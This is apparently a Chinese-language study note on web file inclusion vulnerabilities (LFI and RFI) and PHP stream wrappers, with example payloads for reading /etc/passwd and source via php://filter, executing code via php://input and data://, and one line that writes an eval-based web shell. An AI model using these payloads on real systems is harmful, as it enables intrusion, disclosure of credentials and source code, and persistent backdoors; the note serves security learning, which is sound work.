---
{"dg-publish":true,"dg-path":"xiaodi/WEB攻防_文件包含.md","permalink":"/xiaodi/WEB攻防_文件包含/","title":"WEB攻防_文件包含"}
---

# 原理
程序开发人员通常会把可重复使用的函数写到单个文件中，在使用某些函数时，
直接调用此文件，而无须再次编写，这种调用文件的过程一般被称为文件包含。
在包含文件的过程中，如果文件能进行控制，则存储文件包含漏洞

# 分类
## 本地文件包含漏洞 (LFI)

LFI 漏洞发生在应用程序允许用户通过输入文件路径包含服务器本地的文件时。攻击者可以利用这个漏洞读取服务器上的敏感文件，如配置文件、密码文件等，甚至可能执行恶意代码。常见的攻击路径包括：

1. **读取系统文件**：例如 `/etc/passwd` 文件包含系统用户信息。
2. **读取应用配置文件**：例如 `config.php` 包含数据库配置和密码。
3. **读取日志文件**：可以通过包含 Web 服务器的日志文件，找到其他可利用的漏洞。
4. **配合文件上传**：如果可以上传文件，则可以考虑上传恶意代码来包含


## 远程文件包含漏洞 (RFI)

RFI 漏洞发生在应用程序允许用户通过输入文件路径包含远程服务器上的文件时。攻击者可以利用这个漏洞将远程服务器上的恶意代码包含到目标服务器的执行环境中，从而远程控制目标服务器。RFI 攻击通常包括：

1. **包含远程恶意脚本**：攻击者可以将恶意脚本上传到他们的服务器，并通过包含这个远程脚本执行恶意代码。
2. **植入后门**：攻击者可以通过包含后门脚本，获得对目标服务器的持续访问。



# 伪协议

PHP伪协议是一种在PHP中提供的特殊协议，可以用于处理不同类型的数据流、文件和资源。它们允许开发人员通过一种统一的方式访问和操作这些资源。

详细参考：
https://segmentfault.com/a/1190000018991087
## 常用伪协议

### `file://[文件的绝对路径和文件名]`

用于访问本地文件系统。可以读取或写入本地文件。

如：`http://127.0.0.1/include.php?file=file://E:\phpStudy\PHPTutorial\WWW\phpinfo.txt`


###  `php://`

**1. `php://filter`**

作用：

读取源代码并进行base64编码输出

示例：

 `http://127.0.0.1/cmd.php?cmd=php://filter/read=convert.base64-encode/resource=[文件名]（针对php文件需要base64编码）`

参数：

 resource=<要过滤的数据流> 这个参数是必须的。它指定了你要筛选过滤的数据流  
 read=<读链的筛选列表> 该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。  
 write=<写链的筛选列表> 该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。  
 <；两个链的筛选列表> 任何没有以 read= 或 write= 作前缀 的筛选器列表会视情况应用于读或写链。

**2. `php://input`**

作用：

 执行POST数据中的php代码

示例：
 `http://127.0.0.1/cmd.php?cmd=php://input`

 POST数据：`<?php phpinfo()?>`

注意：

 `enctype="multipart/form-data"` 的时候 `php://input` 是无效的


###  `data://`

作用：

 自PHP>=5.2.0起，可以使用data://数据流封装器，以传递相应格式的数据。通常可以用来执行PHP代码。一般需要用到`base64编码`传输

示例：

 `http://127.0.0.1/include.php?`
 
 `file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b`


## 常用伪协议语句
**文件读取：**
`file:///etc/passwd`
`php://filter/read=convert.base64-encode/resource=phpinfo.php`

**文件写入：**
`php://filter/write=convert.base64-encode/resource=phpinfo.php`
`php://input POST:<?php fputs(fopen('shell.php','w'),'<?php @eval($_GET[cmd]); ?>'); ?>`


**代码执行：**
`php://input POST:<?php phpinfo();?>`
`data://text/plain,<?php phpinfo();?>`
`data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b`



![Pasted image 20240807172651.png](/img/user/picture/Pasted%20image%2020240807172651.png)



[[blog/安全/靶场/CTFshow_文件包含\|CTFshow_文件包含]]